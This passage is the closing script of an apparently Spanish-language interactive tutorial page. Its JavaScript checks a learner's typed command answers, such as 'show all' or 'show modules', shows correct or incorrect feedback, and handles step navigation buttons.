                         isCorrect = userAnswer === 'show all' || userAnswer === 'show modules';
                         break;

                }

                if (isCorrect) {
                    feedbackDiv.classList.add('correct');
                    feedbackDiv.textContent = '¡Correcto! Muy bien.';
                } else {
                    feedbackDiv.classList.add('incorrect');
                    feedbackDiv.textContent = `Incorrecto. Revisa la explicación y la demostración. El comando (o comandos) esperado(s) tiene(n) una estructura similar a: ${correctAnswer}`;
                }
                 feedbackDiv.style.display = 'block';
            }

            prevBtn.addEventListener('click', () => {
                if (currentStepIndex > 0) {
                    showStep(currentStepIndex - 1);
                }
            });

            nextBtn.addEventListener('click', () => {
                if (currentStepIndex < totalSteps - 1) {
                    showStep(currentStepIndex + 1);
                }
            });

            checkButtons.forEach(button => {
                button.addEventListener('click', () => {
                    const stepNumber = parseInt(button.dataset.step);
                    checkExercise(stepNumber);
                });
            });

            // Initial setup
            showStep(0);
        });
    </script>

</body>
</html>